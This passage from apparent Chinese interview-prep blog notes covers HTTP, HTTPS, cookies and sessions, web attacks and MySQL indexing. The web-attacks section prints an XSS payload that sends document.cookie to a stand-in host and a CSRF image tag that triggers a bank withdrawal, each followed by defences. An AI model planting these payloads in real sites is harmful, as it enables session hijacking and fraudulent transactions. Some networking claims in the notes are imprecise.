if-None-match——”服务器没有Sample.html,所有可以处理你的请求”</p><p><strong>节约带宽资源</strong>:HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p><p>Range, 允许只请求资源的某个部分. If-Range另外如果资源与请求字段的ETag相同，则返回一定范围的资源，否则返回全部。如果用If- Match，请求不符合，客户端还会再发送一个请求，多了两倍的功夫。</p><p><strong>错误状态响应码</strong> :在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p><h2 id="Http长连接是什么？"><a href="#Http长连接是什么？" class="headerlink" title="Http长连接是什么？"></a>Http长连接是什么？</h2><p><strong>HTTP/1.0默认短连接</strong>，每次请求都要重新建立一次连接。HTTP 是基于TCP/IP协议的,每一次建立或者断开连接都需要三次握手四次挥手的开销，开销会比较大。</p><p><strong>HTTP 1.1默认使用长连接</strong> ,默认开启Connection： keep-alive。 一个tcp连接允许的是6个并发HTTP连接。</p><p><strong>参数：Keep-Alive: timeout=60</strong>最大等待时间，如果配置为0，则表示关掉keepalive，</p><p><strong>场景：</strong>在客户端需要多次访问同一个server时，比如图片服务器，打开长连接可以大量减少time-wait的数量。</p><p>HTTP/1.1的持续连接有非流水线方式和流水线方式 。流水线已经被更好的算法给代替，如 <code>multiplexing</code>，已经用在 HTTP/2。。</p><p><strong>HTTP2 信道复用</strong>，在 TCP 连接上可以<strong>并发</strong>的发送 HTTP 请求，意味着链接网站是只需要一个 TCP 连接。<a href="https://link.zhihu.com/?target=http%3A//google.com" target="_blank" rel="noopener">http://google.com</a>的页面都是用的 HTTP2。http连接的connection id 都是一个，注意，同域 id 才相同，不同域需要创建 tcp 连接，这样降低了开销，速度有质的提升。谷歌使用的是2.0</p><h2 id="HTTP和-HTTPS的区别？"><a href="#HTTP和-HTTPS的区别？" class="headerlink" title="HTTP和 HTTPS的区别？"></a>HTTP和 HTTPS的区别？</h2><p><strong>端口</strong> ：HTTP的URL由“http://”起始且默认使用端口80，而HTTPS的URL由“https://”起始且默认使用端口443。</p><p><strong>安全性</strong>HTTP协议运行在TCP之上，弊端：1.所有传输的内容都是明文。2.客户端和服务器端都无法验证对方的身份。3.无法保证资源是否被篡改</p><p>HTTPS是运行在SSL/TLS之上的HTTP协议，SSL/TLS 运行在TCP之上。采用<strong>混合加密+数字证书认证机构+MAC的报文摘要</strong>。HTTPS采用混合加密机制，加密采用对称加密，但对称加密的密钥用服务器方的证书进行了非对称加密。</p><p><strong>资源消耗</strong>：加密通信会耗费更多服务器资源，速度也会变慢。在包含个人信息等敏感数据时</p><h2 id="HTTPS的流程？"><a href="#HTTPS的流程？" class="headerlink" title="HTTPS的流程？"></a>HTTPS的流程？</h2><h2 id="HTTP有哪些请求方法？它们的作用或者说应用场景？"><a href="#HTTP有哪些请求方法？它们的作用或者说应用场景？" class="headerlink" title="HTTP有哪些请求方法？它们的作用或者说应用场景？"></a>HTTP有哪些请求方法？它们的作用或者说应用场景？</h2><p>GET: 请求指定的页面信息，并返回实体主体。</p><p>HEAD: 和GET类似，只不过不返回报文主体，只返回响应首部。可用于确认URI的有效性及资源更新的日期时间；</p><p>POST: 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</p><p>PUT: 用来传输文件，要求请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。</p><p>DELETE: 和PUT相反，按请求URI删除指定的资源。</p><p>OPTIONS: 用来查询针对请求URI指定的资源支持的方法。如果请求成功，会有一个Allow的头包含类似“GET,POST”这样的信息</p><p>TRACE: 让服务端将之前的请求通信返回给客户端的方法（因此客户端可以得知请求是怎么一步步到服务端的）。主要用于测试或诊断。</p><p>CONNECT: 使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p><h2 id="请求转发与重定向区别"><a href="#请求转发与重定向区别" class="headerlink" title="请求转发与重定向区别"></a>请求转发与重定向区别</h2><p><strong>转发是服务器行为，重定向是客户端行为。</strong></p><h3 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h3><ul><li>转发过程：浏览器发送http请求——》服务器接受此请求——》调用内部的一个方法在容器内部完成请求处理和转发动作——》将目标资源发送给浏览器；</li><li>必须是同一个web容器下的url，中间传递的是自己的容器内的request。</li><li>浏览器路径栏：显示第一次访问的路径，客户是感觉不到服务器做了转发的。转</li><li>传输的信息不会丢失。</li></ul><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><ul><li>重定向过程：客户浏览器发送http请求——》web服务器接受后发送302状态码响应及对应新的location给客户浏览器——》客户浏览器发现是302响应，则<strong>自动</strong>再发送一个新的http请求，请求url是新的location地址——》服务器根据此请求寻找资源并发送给客户。</li><li>可以重定向到任意URL，既然是浏览器重新发出了请求，则就没有什么request传递的概念了。</li><li>浏览器路径栏：显示的是其重定向的路径，客户可以观察到地址的变化的。</li><li>重定向，其实是至少两次request</li></ul><blockquote><p><a href="https://www.cnblogs.com/yqin/archive/2010/06/07/1810454.html" target="_blank" rel="noopener">HTTP中的重定向和请求转发的区别</a></p></blockquote><h1 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h1><h2 id="cookie和session区别和联系？"><a href="#cookie和session区别和联系？" class="headerlink" title="cookie和session区别和联系？"></a>cookie和session区别和联系？</h2><ol><li>保存地方。Session是在<strong>服务端保存</strong>的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是<strong>客户端保存</strong>用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</li><li>实现原理。session的运行依赖session id，而session id是存在cookie中的，也就是说，如果浏览器禁用了cookie ，同时session也会失效（但是可以通过url重写，即在url中传递session_id）</li><li>大小。cookie最多为 300个 , 并且每个不能超过 4KB,每个 Web 站点能设置的 Cookie 总数不能超过 20个。session当访问增多，会比较占用你服务器的性能。</li><li>安全。cookie不安全，可以通过XSS跨域攻击窃取</li></ol><p>总的来说，cookie是钥匙，session是盒子。</p><h2 id="session的原理？"><a href="#session的原理？" class="headerlink" title="session的原理？"></a>session的原理？</h2><p>Session会话指的是从用户打开浏览器访问一个网站开始，无论在这个网站中访问了多少页面，点击了多少链接，都属于同一个会话。 直到该用户关闭浏览器为止，都属于同一个会话。比如网上购物，每个用户有自己的购物车，当点击下单时，由于HTTP协议无状态，并不知道是哪个用户操作的，所以服务端要为特定的用户创建特定的Session，用于标识这个用户，并且跟踪用户。</p><p>Session原理：浏览器第一次访问服务器时，服务器会响应一个cookie给浏览器。这个cookie记录的就是sessionId，之后每次访问携带着这个sessionId，服务器里查询该sessionId，便可以识别并跟踪特定的用户了。</p><p>Cookie原理：第一次访问服务器，服务器响应时，要求浏览器记住一个信息。之后浏览器每次访问服务器时候，携带第一次记住的信息访问。相当于服务器识别客户端的一个通行证。</p><p>Cookie不可跨域，浏览览器判断一个网站是否能操作另一个网站Cookie的依据是域名。Google与Baidu的域名不一样，因此Google不能操作Baidu的Cookie，换句话说Google只能操作Google的Cookie。</p><h1 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h1><h2 id="一、跨站脚本攻击（document-cookie）"><a href="#一、跨站脚本攻击（document-cookie）" class="headerlink" title="一、跨站脚本攻击（document.cookie）"></a>一、跨站脚本攻击（document.cookie）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>之后该内容可能会被渲染成以下形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h4 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h4><h5 id="1-设置-Cookie-为-HttpOnly，防止-脚本调用"><a href="#1-设置-Cookie-为-HttpOnly，防止-脚本调用" class="headerlink" title="1. 设置 Cookie 为 HttpOnly，防止 脚本调用"></a>1. 设置 Cookie 为 HttpOnly，防止 脚本调用</h5><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p><h5 id="2-过滤特殊字符"><a href="#2-过滤特殊字符" class="headerlink" title="2. 过滤特殊字符"></a>2. 过滤特殊字符</h5><p>例如将 <code>&lt;</code> <strong>转义</strong>为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p><p>富文本编辑器允许用户输入 HTML 代码，通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。比如form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p><h2 id="二、跨站请求伪造（登录信息尚未过期）"><a href="#二、跨站请求伪造（登录信息尚未过期）" class="headerlink" title="二、跨站请求伪造（登录信息尚未过期）"></a>二、跨站请求伪造（登录信息尚未过期）</h2><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</span><br></pre></td></tr></table></figure><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。</span><br></pre></td></tr></table></figure><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，<strong>登录信息尚未过期</strong>，那么她就会损失 1000 美元。（两个刚好，刚好有账户名为李华的人，刚好登陆信息没有过期）</p><p>由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。如发邮件，发消息，甚至财产操作如转账和购买商品。他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是<strong>欺骗用户浏览器，让其以用户的名义执行操作。</strong></p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p><h4 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h4><h5 id="1-标识请求来源的地址"><a href="#1-标识请求来源的地址" class="headerlink" title="1. 标识请求来源的地址"></a>1. 标识请求来源的地址</h5><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求<strong>来源的地址在同一个域名</strong>下，可以极大的防止 CSRF 攻击。但存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><h5 id="2-添加校验-Token，生成随机数"><a href="#2-添加校验-Token，生成随机数" class="headerlink" title="2. 添加校验 Token，生成随机数"></a>2. 添加校验 Token，生成随机数</h5><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p><h5 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h5><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p><h2 id="三、SQL-注入攻击"><a href="#三、SQL-注入攻击" class="headerlink" title="三、SQL 注入攻击"></a>三、SQL 注入攻击</h2><h3 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h3><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement stmt = connection.prepareStatement(&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;);</span><br><span class="line">stmt.setString(1, userid);</span><br><span class="line">stmt.setString(2, password);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure><h2 id="四、拒绝服务攻击"><a href="#四、拒绝服务攻击" class="headerlink" title="四、拒绝服务攻击"></a>四、拒绝服务攻击</h2><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 秋招 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库——秋招复习笔记</title>
      <link href="/2019/10/06/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2019/10/06/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>[TOC]</p><h2 id="一条sql的执行过程"><a href="#一条sql的执行过程" class="headerlink" title="一条sql的执行过程"></a>一条sql的执行过程</h2><p>Server层包括连接器、查询缓存、分析器、优化器、执行器等，涵盖MySQL的大多数核心服务功能，以及所有的内置函数（如日期、时间、数学和加密函数等），所有跨存储引擎的功能都在这一层实现，比如存储过程、触发器、视图等。</p><p>而存储引擎层负责数据的存储和提取。其架构模式是插件式的，支持InnoDB、MyISAM、Memory等多个存储引擎。现在最常用的存储引擎是InnoDB，它从MySQL 5.5.5版本开始成为了默认存储引擎。</p><ol><li>客户端发送一条查询给服务器。</li><li>检查<strong>查询缓存</strong>，之前执行过会以key是查询的语句+value是查询的结果的形式缓存在内存中。如果命中了缓存则直接返回结果。否则进入下一阶段。（不过因为查询缓存的失效非常频繁，8.0删除了查询缓存这个功能。）</li><li><strong>分析器</strong>做两件事：一、“词法分析”识别SQL里面的字符串分别代表什么。二、.”语法分析”判断SQL语句是否满足MySQL语法。</li><li><strong>优化器</strong>决定使用哪个索引、各个表的连接顺序，然后生成对应的执行计划。</li><li><strong>存储引擎的API</strong>来执行查询。（默认引擎是InnoDB）</li><li>将<strong>结果集返回</strong>给客户端。</li></ol><h3 id="查询优化器"><a href="#查询优化器" class="headerlink" title="查询优化器"></a>查询优化器</h3><p>一条SQL语句的查询，可以有不同的执行方案，至于最终选择哪种方案，需要通过优化器进行选择，选择执行成本最低的方案。</p><p>在一条单表查询语句真正执行之前，MySQL的查询优化器会找出执行该语句所有可能使用的方案，对比之后找出成本最低的方案。</p><p>这个成本最低的方案就是所谓的执行计划。优化过程大致如下：</p><ul><li>1、根据搜索条件，找出所有可能使用的索引 </li><li>2、计算全表扫描的代价 </li><li>3、计算使用不同索引执行查询的代价 </li><li>4、对比各种执行方案的代价，找出成本最低的那一个</li></ul><h3 id="索引失效"><a href="#索引失效" class="headerlink" title="索引失效"></a>索引失效</h3><p>可能是因为优化器错误判断，判断是依据采样统计+计算回表的代价。有时候当少量的非聚集索引和大量的聚集索引可能优化器会选错聚集索引，因为它把非聚集索引的回表代价也计算进去，可以强制指定索引或修改语句诱导优化器再或者直接删除误用索引。</p><h3 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h3><h2 id="MyISAM和InnoDB区别"><a href="#MyISAM和InnoDB区别" class="headerlink" title="MyISAM和InnoDB区别"></a>MyISAM和InnoDB区别</h2><p>MySQL 5.5版本后默认的存储引擎为InnoDB。</p><p>不同点</p><table><thead><tr><th>innoDB</th><th>MyISAM</th></tr></thead><tbody><tr><td>聚集索引叶子节点保存了完整的数据记录</td><td>叶子结点记录的是地址（非聚集索引）</td></tr><tr><td>事务</td><td>不支持事务</td></tr><tr><td>行锁、表锁</td><td>只支持表锁</td></tr><tr><td>外键</td><td>不支持外键</td></tr><tr><td>崩溃后的安全恢复</td><td>不支持崩溃后的安全恢复</td></tr><tr><td>MVCC</td><td>不支持MVCC</td></tr><tr><td>不支持全文索引（5.6后支持）</td><td>支持全文索引</td></tr></tbody></table><p><strong>两者的对比：</strong></p><ol><li><strong>是否支持行级锁</strong> : MyISAM 只有表级锁(table-level locking)，而InnoDB 支持行级锁(row-level locking)和表级锁,默认为行级锁。</li><li><strong>是否支持事务和崩溃后的安全恢复： MyISAM</strong> 强调的是性能，每次查询具有原子性,其执行速度比InnoDB类型更快，但是不提供事务支持。但是<strong>InnoDB</strong> 提供事务支持事务，外部键等高级数据库功能。 具有事务(commit)、回滚(rollback)和崩溃修复能力(crash recovery capabilities)的事务安全(transaction-safe (ACID compliant))型表。</li><li><strong>是否支持外键：</strong> MyISAM不支持，而InnoDB支持。</li><li><strong>是否支持MVCC</strong> ：仅 InnoDB 支持。应对高并发事务, MVCC比单纯的加锁更高效;MVCC只在 <code>READ COMMITTED</code> 和 <code>REPEATABLE READ</code> 两个隔离级别下工作</li><li>InnoDB采用<strong>聚集</strong>的方式，每张表按照主键的顺序进行存放。如果没有主键，InnoDB会为每一行生成一个6字节的ROWID并以此为主键；MyISAM可以不指定主键和索引</li><li>InnoDB没有保存表的总行数，因此查询行数时会遍历整表；而MyISAM有一个变量存储可表的<strong>总行</strong>数，查询时可以直接取出该值《MySQL高性能》上面有一句话这样写到:</li></ol><blockquote><p>不要轻易相信“MyISAM比InnoDB快”之类的经验之谈，这个结论往往不是绝对的。在很多我们已知场景中，InnoDB的速度都可以让MyISAM望尘莫及，尤其是用到了聚簇索引，或者需要访问的数据都可以放入内存的应用。</p></blockquote><p>一般情况下我们选择 InnoDB 都是没有问题的，但是某些情况下你<strong>并不在乎可扩展能力和并发能力，也不需要事务支持，也不在乎崩溃后的安全恢复问题的话</strong>，选择MyISAM也是一个不错的选择。但是一般情况下，我们都是需要考虑到这些问题的。</p><h2 id="数据字段的类型"><a href="#数据字段的类型" class="headerlink" title="数据字段的类型"></a>数据字段的类型</h2><h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><h2 id="索引数据结构"><a href="#索引数据结构" class="headerlink" title="索引数据结构"></a>索引数据结构</h2><p>常见的MySQL主要有两种结构：Hash索引和B+ Tree索引，我们使用的是InnoDB引擎，默认的是B+树</p><h3 id="hash索引和btree索引区别"><a href="#hash索引和btree索引区别" class="headerlink" title="hash索引和btree索引区别"></a>hash索引和btree索引区别</h3><ol><li>范围</li><li>排序</li><li>大量Hash值相等</li><li>联合索引并不能更省时间</li><li><p>不能避免表扫描</p><p>1).Hash 索引仅仅能满足”=”,”IN”和”&lt;=&gt;”查询，不能使用<strong>范围查询。</strong><br> 由于 Hash 索引比较的是进行 Hash 运算之后的 Hash 值，所以它只能用于等值的过滤，不能用于基于范围的过滤，因为经过相应的 Hash 算法处理之后的 Hash 值的大小关系，并不能保证和Hash运算前完全一样。<br>2).Hash 索引无法被用来避免数据的<strong>排序</strong>操作。<br> 由于 Hash 索引中存放的是经过 Hash 计算之后的 Hash 值，而且Hash值的大小关系并不一定和 Hash 运算前的键值完全一样，所以数据库无法利用索引的数据来避免任何排序运算；<br>3).Hash 索引不能利用部分索引键查询。<br> 对于组合索引，Hash 索引在计算 Hash 值的时候是组合索引键合并后再一起计算 Hash 值，而不是单独计算 Hash 值，所以通过组合索引的前面一个或几个索引键进行查询的时候，Hash 索引也无法被利用。<br>4).Hash 索引在任何时候都<strong>不能避免表扫描。</strong><br> 前面已经知道，Hash 索引是将索引键通过 Hash 运算之后，将 Hash运算结果的 Hash 值和所对应的行指针信息存放于一个 Hash 表中，由于不同索引键存在相同 Hash 值，所以即使取满足某个 Hash 键值的数据的记录条数，也无法从 Hash 索引中直接完成查询，还是要通过访问表中的实际数据进行相应的比较，并得到相应的结果。<br>5).Hash 索引遇到<strong>大量Hash值相等</strong>的情况后性能并不一定就会比B-Tree索引高。<br> 对于选择性比较低的索引键，如果创建 Hash 索引，那么将会存在大量记录指针信息存于同一个 Hash 值相关联。这样要定位某一条记录时就会非常麻烦，会浪费多次表数据的访问，而造成整体性能低下</p></li></ol><h3 id="B-树和B-树的区别？"><a href="#B-树和B-树的区别？" class="headerlink" title="B+树和B-树的区别？"></a>B+树和B-树的区别？</h3><p>相关的树</p><ul><li>二叉查找/搜索/排序树</li><li>完全二叉树</li><li>平衡二叉树AVL=二叉查找+完全二叉树</li></ul><p>区别：b+树非叶子结点仅仅用于索引，叶子结点存储数据。叶子结点是链接起来的，方便做范围统计。，而B树每一个结点都存储Key和value。<strong>B+非叶子节点并不存储行数据，是为了能存储更多索引键，从而降低B+树的高度，进而减少IO次数。</strong></p><p>b+</p><ol><li><p>因为矮胖，磁盘读写代价低，更适合用于数据库和操作系统的文件系统中。</p></li><li><p>效率更稳定，所有查询必须从根到叶子</p></li><li><p>范围查询</p></li></ol><p>   InnoDB的B+ Tree可能存储的是<strong>整行数据</strong>，也有可能是<strong>主键的值</strong>。</p><h3 id="聚集索引与非聚集索引的区别？"><a href="#聚集索引与非聚集索引的区别？" class="headerlink" title="聚集索引与非聚集索引的区别？"></a>聚集索引与非聚集索引的区别？</h3><ul><li>在 InnoDB 里，索引B+ Tree的<strong>叶子节点存储了整行数据</strong>的是主键索引，也被称之为聚簇索引。而索引B+ Tree的<strong>叶子节点存储了主键的值</strong>的是非主键索引，也被称之为非聚簇索引</li><li>聚集索引决定了表的物理排序顺序，一个表只能有一个物理排列顺序，所以<strong>一个表一定有并且只能有一个聚集索引</strong>。</li><li><strong>聚集索引更快</strong>，因为主键索引树的叶子节点直接就是我们要查询的整行数据了。而非主键索引的叶子节点是主键的值，查到主键的值以后，还需要再通过主键的值再进行一次查询，所以非主键索引包含两次查找。通过覆盖索引也可以只查询一次。</li></ul><p>innoDB每个表都需要有一个聚集索引，它的选择为</p><ul><li>如果定义了<strong>主键</strong>，那么InnoDB会选择其作为聚集索引；</li><li>如果没有显式定义主键，则InnoDB会选择<strong>第一个不包含有NULL值</strong>的唯一索引作为主键索引；</li><li>如果也没有这样的唯一索引，则InnoDB会选择隐含的聚集索引</li></ul><h2 id="索引基础四连问"><a href="#索引基础四连问" class="headerlink" title="索引基础四连问"></a>索引基础四连问</h2><h3 id="哪些情况适合建立索引？"><a href="#哪些情况适合建立索引？" class="headerlink" title="哪些情况适合建立索引？"></a>哪些情况适合建立索引？</h3><ol><li>在经常要搜索的列上</li><li>经常出现在where后面的列上</li><li>在作为主键、外键的列上</li><li>经常需要排序、分组和联合操作的字段建立索引</li></ol><h3 id="哪些情况不适合建立索引？"><a href="#哪些情况不适合建立索引？" class="headerlink" title="哪些情况不适合建立索引？"></a>哪些情况不适合建立索引？</h3><ol><li>like “%xxx”、not in ， !=、OR</li><li>对列进行函数运算的情况（如 where md5(password) = “xxxx”）</li><li>查询中很少使用的字段</li><li>数值太少的字段</li><li>唯一性差的字段</li><li>更新频繁的字段</li><li>ext和blob等大字段不适合建立索引</li></ol><h3 id="索引什么时候失效"><a href="#索引什么时候失效" class="headerlink" title="索引什么时候失效"></a>索引什么时候失效</h3><ol><li>模糊查询中，通配符在最前面时，即LIKE ‘%abc’这样不能命中索引</li><li>使用了not in, &lt;&gt;,!=则不会命中索引。注：&lt;&gt;是不等号</li><li>innoDB引擎下，若使用OR，只有前后两个列都有索引才能命中（执行查询计划，type是index_merge），否则不会使用索引。</li><li>·对列进行<strong>函数运算</strong>的情况（如 where md5(password) = “xxxx”）</li><li>联合索引中，遇到范围查询时，其后的索引不会被命中。或者没有遵循最左匹配原则。</li><li>存了数字的char或varchar类型，常见的如用字符串表示的手机号，在查询时不加引号，则不会命中（如where phone=‘13340456789’能命中，where phone=13340456789不能命中）</li><li>当数据量小时，MySQL发现全表扫描反而比使用索引查询更快时不会使用索引。</li><li>优化器错误的选择了索引</li></ol><h2 id="联合索引"><a href="#联合索引" class="headerlink" title="联合索引"></a>联合索引</h2><h3 id="为什么要使用联合索引？"><a href="#为什么要使用联合索引？" class="headerlink" title="为什么要使用联合索引？"></a>为什么要使用联合索引？</h3><p>MySQL5.0之前，一个表一次只能使用一个索引，无法同时使用多个索引分别进行条件扫描。但是从5.1开始，引入了 index merge 优化技术，对同一个表可以使用多个索引分别进行条件扫描。</p><p><a href="https://www.jianshu.com/p/XgXfhf" target="_blank" rel="noopener">推荐阅读这篇博客</a></p><p><strong>减少开销</strong>。建了一个(a,b,c)的联合索引，相当于建了(a),(a,b),(a,b,c)三个索引</p><p><strong>覆盖索引</strong>。减少了随机IO操作。同样的有复合索引（a,b,c），如果有如下的sql: select a,b,c from table where a=1 and b = 1。那么MySQL可以直接通过遍历索引取得数据，而无需回表，这减少了很多的随机io操作</p><p><strong>效率高</strong>。索引列越多，通过索引筛选出的数据越少。比如有1000W条数据的表，有如下sql:select <em> from table where a = 1 and b =2 and c = 3,假设假设每个条件可以筛选出10%的数据，如果只有单值索引，那么通过该索引能筛选出1000W</em>10%=100w 条数据，然后再回表从100w条数据中找到符合b=2 and c= 3的数据，然后再排序，再分页；如果是复合索引，通过索引筛选出1000w <em>10% </em>10% *10%=1w，然后再排序、分页。</p><h3 id="最左匹配原则"><a href="#最左匹配原则" class="headerlink" title="最左匹配原则"></a>最左匹配原则</h3><p>建了一个(a,b,c)的联合索引，那么实际等于建了(a),(a,b),(a,b,c)三个索引，但是有时在条件查询时只会匹配到a或者(a, b)而不会匹配到(a, b, c)。下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table WHERE a = 1 AND c = 3;</span><br></pre></td></tr></table></figure><p>使用了索引a，c不走索引</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table WHERE a = 1 AND b &lt; 2 AND c = 3;</span><br></pre></td></tr></table></figure><p><strong>使用到了索引(a,b)，c不走索引</strong></p><p>建立联合索引(a, b ,c)，所以索引是按照a -&gt; b -&gt; c的顺序进行排序的。<strong>a-b-c这样的索引是先找a，然后在范围里面找b，再在范围内找c。</strong> 所以上面的语句里的c 会分散在很多个b里面且不是排序的，所以没办法走索引。</p><p>举个例子比如(a, b)联合索引，先按a排序再按b排序，得到</p><p>(1,1)-&gt;(1, 2)-&gt;(2, 1)  (2, 4)-&gt;(3, 1)-&gt;(3, 2)</p><p>如果执行select a from table where b=2，就没有使用到(a, b)这个联合索引，因为b的值1,2,1,4,1,2显然不是排序的。</p><p>具体来说：MySQL会从左开始一直向右匹配直到遇到范围查询（&gt;,&lt;,BETWEEN,LIKE）就停止匹配。</p><p>比如： a = 1 AND b = 2 AND c &gt; 3 AND d = 4，如果建立 （a,b,c,d）顺序的索引，使用了索引(a, b, c)，但是d是没有走索引的</p><p>如果建立（a,b,d,c）的索引，则可以命中索引(a, b, c, d)，其中a,b,d的顺序可以任意调整。</p><p>等于（=）和in 可以乱序。比如，索引是KEY idx_id_name(<code>seckill_id</code>,<code>name</code>)</p><p>explain select * from seckill where name=’1000元秒杀iphone6’ and seckill_id=1000会走索引。</p><h3 id="如何建立复合索引，可以使sql语句能尽可能匹配到索引？"><a href="#如何建立复合索引，可以使sql语句能尽可能匹配到索引？" class="headerlink" title="如何建立复合索引，可以使sql语句能尽可能匹配到索引？"></a>如何建立复合索引，可以使sql语句能尽可能匹配到索引？</h3><ul><li><strong>等于条件的索引放在前面（最左），范围查询放在后面。</strong> a = 1 AND b = 2 AND c &gt; 3 AND d = 4，建立（a, b, d, c）就是不错的选择；</li><li><strong>先过滤后排序</strong>（ORDER BY）如SELECT * FROM t WHERE c = 100 and d = ‘xyz’ ORDER BY b建立(c, d, b)联合索引就是不错的选择</li><li><strong>对于索引列的查询，一般不建议使用LIKE操作</strong>，像LIKE ‘%abc’这样的不能命中索引；不过LIKE ‘abc%’可以命中索引。</li></ul><p><a href="https://www.jb51.net/article/81875.htm" target="_blank" rel="noopener">https://www.jb51.net/article/81875.htm</a>)</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="主键和唯一索引的区别？"><a href="#主键和唯一索引的区别？" class="headerlink" title="主键和唯一索引的区别？"></a>主键和唯一索引的区别？</h3><ul><li>主键一定是唯一索引，唯一索引不一定是主键。</li><li>主键是一种约束，唯一索引是索引，一种数据结构。</li><li>一个表中可以有多个唯一索引，但只能有一个主键。</li><li>主键不允许空值，唯一索引允许。</li><li>主键可以做为<a href="https://www.baidu.com/s?wd=外键&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">外键</a>，唯一索引不行；</li></ul><h3 id="COUNT-列名-和COUNT-区别"><a href="#COUNT-列名-和COUNT-区别" 